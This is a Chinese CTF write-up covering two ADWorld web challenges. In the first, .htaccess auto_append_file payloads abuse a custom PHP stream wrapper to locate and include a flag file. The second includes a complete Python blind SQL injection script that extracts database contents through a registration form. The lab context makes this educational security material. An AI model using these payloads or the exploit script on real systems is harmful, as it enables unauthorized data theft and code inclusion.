---
title: 攻防世界 ADWorld Web 部分题解（2）
tags:
  - Writeup
  - CTF
date: 2019-10-07 00:10:06
---


## 0x01 blgdel

CISCN-2018-Final

目录扫描发现存在 robots.txt、sql.txt 等文件，robots.txt 内容为：Disallow: /config.txt .

- config.txt 

```php
<?php
class master {
	private $path;
	private $name;
	
	function __construct(){}

	function stream_open($path) {
		if(!preg_match('/(.*)\/(.*)$/s',$path,$array,0,9)) return 1;
		$a =$array[1];
		parse_str($array[2], $array);
		
		if(isset($array['path'])) {
			$this->path=$array['path'];
		}
		else return 1;
		if(isset($array['name'])) {
			$this->name=$array['name'];
		}
		else return 1;
	
		if($a==='upload') {
			return $this->upload($this->path, $this->name);
		}
		elseif($a==='search') {
			return $this->search($this->path,$this->name);
		}
		else return 1;
	}
	function upload($path,$name) {
		if(!preg_match('/^uploads\/[a-z]{10}\/$/is',$path)||empty($_FILES[$name]['tmp_name']))
			return 1;
		
		$filename=$_FILES[$name]['name'];
		echo $filename;
		
		$file=file_get_contents($_FILES[$name]['tmp_name']);
		
		$file=str_replace('<','!',$file);
		$file=str_replace(urldecode('%03'),'!',$file);
		$file=str_replace('"','!',$file);
		$file=str_replace("'",'!',$file);
		$file=str_replace('.','!',$file);
		if(preg_match('/file:|http|pre|etc/is',$file)) {
			echo 'illegalbbbbbb!';
			return 1;
		}
		
		file_put_contents($path.$filename,$file);
		file_put_contents($path.'user.jpg',$file);
		
		echo 'upload success!';
		return 1;
	}
	function search($path,$name) {
		if(!is_dir($path)) {
			echo 'illegal!';
			return 1;
		}
		$files=scandir($path);
		echo '</br>';
		foreach($files as $k=>$v) {
			if(str_ireplace($name,'',$v)!==$v) {
				echo $v.'</br>';
			}
		}
		return 1;
	}
	
	function stream_eof() {
		return true;
	}
	function stream_read() {
		return '';
	}
	function stream_stat() {
		return '';
	}
	
}

stream_wrapper_unregister('php');
stream_wrapper_unregister('phar');
stream_wrapper_unregister('zip');
stream_wrapper_register('master','master');

?>
```

1. config.php 中注册了自定义的 master 协议处理器，同时禁用了 PHP、Phar、Zip等伪协议。

2. upload() 函数中对上传文件的内容进行了过滤，过滤了`<`、`"`、`'`和`.`等字符，统一替换为 `!`，同时黑名单正则匹配过滤了文件中 `file:`、`http`、`pre`、`etc`等关键字。

3. 结合 config.php 内容以及 upload()函数对上传文件内容中 `pre` 关键字的过滤，猜测用户上传文件目录默认包含了 config.php (`php_value auto_prepend_file config.php`). 

- sql.txt

```sql
CREATE DATABASE `sshop` DEFAULT CHARACTER SET utf8 COLLATE utf8_general_ci;
USE `sshop`;
CREATE TABLE `sshop`.`users` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(255) NULL DEFAULT NULL,
  `mail` varchar(255) NULL DEFAULT NULL,
  `password` varchar(255) NULL DEFAULT NULL,
  `point` varchar(255) NULL DEFAULT NULL,
  `shopcar` varchar(255) NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci;
```

`User.php` 头像上传处可上传任意文件（需满足用户积分 >= 100，可通过邀请用户注册获取积分，每成功注册一名用户邀请人将获取 10 积分，注册10个用户邀请人统一填写统一用户即可集齐 100 积分）。

![](/assets/images/move/20191007002644.png)

考虑升级 文件上传漏洞为 **文件上传 + 文件包含**，结合 config.php 的相关限制（无法替换 auto_prepend_file 从而使用PHP、Phar、Zip伪协议）以及无法进行远程文件包含，则将目光放在新注册的 `master` 伪协议上。

分析协议的构成，发现如果我们可以控制协议，则可以给 **任意目录上传/搜索文件**，而协议流程和对象注入差不多，先是执行 __construct 再是 stream_open,upload/search, stream_read... 主要是 upload 和 search，其余方法都做了处理，可以不管。 

上传目录被限制了，我们可以搜索文件。通过上传特定内容的 `.htaccess`，可以实现在任意目录下搜索文件：

```php
php_value auto_append_file master://search/path={}&name={} # 此时注意 / 要替换为 %2f
```

搜索结果可以通过上传并访问一个 1.php 看到 通过几次简单测试，可以得到在如下 payload 时获取到 `hiahiahia_flag` 文件：

```php
php_value auto_append_file master://search/path=%2fhome%2f&name=flag
```

![](/assets/images/move/20191007010459.png)

此时我们再上传一个 `.htaccess`，内容为 `php_value auto_append_file /home/hiahiahia_flag` 即包含 flag，再访问 1.php，即可获取到 flag。

![](/assets/images/move/20191007010618.png)


## 0x02 Flask_SQLi

![](/assets/images/move/20191021000729.png)

基于 Flask 框架开发的一个 Microblog，题目给出了 Web 应用程序源代码，下载源码进行审计。

查看注册框架 `RegistrationForm` 对注册邮箱过滤不严格：

![](/assets/images/move/20191021001150.png)

跟进 `validate_email` 函数:

```python
validate_email() -> Mysql.One -> Mysql.Sel
```

![](/assets/images/move/20191021001553.png)

拼接 SQL 查询语句如下：

```sql
select id from user where email = 'your_input_email'
```

如果注册邮箱已存在则返回 Please use a different email address. 可构造出如下 payload 进行 SQL盲注：

```sql
select id from user where email = 'test'/**/or/**/1=1#/**/@3ND.com'
```

附 exp 如下：

```python
import requests
from bs4 import BeautifulSoup

url = "http://111.198.29.45:53260/register"

r = requests.get(url)
soup = BeautifulSoup(r.text, "html5lib")
token = soup.find_all(id='csrf_token')[0].get("value")

notice = "Please use a different email address."
result = ""

database = "(SELECT/**/GROUP_CONCAT(schema_name/**/SEPARATOR/**/0x3c62723e)/**/FROM/**/INFORMATION_SCHEMA.SCHEMATA)"
tables = "(SELECT/**/GROUP_CONCAT(table_name/**/SEPARATOR/**/0x3c62723e)/**/FROM/**/INFORMATION_SCHEMA.TABLES/**/WHERE/**/TABLE_SCHEMA=DATABASE())"
columns = "(SELECT/**/GROUP_CONCAT(column_name/**/SEPARATOR/**/0x3c62723e)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/WHERE/**/TABLE_NAME=0x666c616161616167)"
data = "(SELECT/**/GROUP_CONCAT(flag/**/SEPARATOR/**/0x3c62723e)/**/FROM/**/flag)"


for i in range(1, 100):
    for j in range(32, 127):
        payload = "test'/**/or/**/ascii(substr(%s,%d,1))=%d#/**/@3ND.com" % (database, i, j)
        post_data = {
            'csrf_token': token,
            'username': '3ND',
            'email':payload,
            'password':'3ND',
            'password2':'3ND',
            'submit':'Register'
        }
        r = requests.post(url, post_data)
        soup = BeautifulSoup(r.text,"html5lib")
        token = soup.find_all(id='csrf_token')[0].get("value")
        if notice in r.text:
            result += chr(j)
            print result
            break
```


